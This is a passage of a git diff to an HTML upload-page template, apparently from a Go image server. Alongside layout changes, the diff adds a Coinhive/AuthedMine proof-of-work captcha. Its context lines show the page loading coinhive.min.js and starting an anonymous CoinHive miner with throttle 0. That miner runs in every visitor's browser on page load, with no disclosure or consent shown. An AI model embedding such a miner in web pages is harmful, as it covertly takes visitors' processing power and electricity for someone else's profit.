@@ -18,19 +18,28 @@ var (
 <script src='https://www.google.com/recaptcha/api.js'></script>
 </head>
 <body>
+<div>
 <b> <a href="https://github.com/gidoBOSSftw5731/imgsrvr/tree/master"> EVERYTHING IS EXPALINED IN SOME DETAIL AT MY GITHUB: </b></a><br>
+</div>
+<div>
 <p>
-Needs JS for captchas {{ .Fn}}
+Needs JS for captchas, only do ONE of your choice {{ .Fn}}
 </p>
 
 <form enctype="multipart/form-data" action="%supload/" method="post">
   Key: <input type="password" name="fn"><br>
   <input type="hidden" name="token" value="{{.}}"/>
 	IMG: <input type="file" name="uploadfile"><br>
-	<div class="g-recaptcha" data-sitekey="%s"></div>
+	<div class="g-recaptcha" data-sitekey="%v"></div>
+	<script src="https://authedmine.com/lib/captcha.min.js" async></script>
+	<div class="coinhive-captcha" data-hashes="1024" data-key="%v">
+		<em>Loading Captcha...<br>
+		If it doesn't load, please disable Adblock!</em>
+	</div>
 	<input type="submit" value="Go!">
 	</form>
-
+</div>
+</div>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});
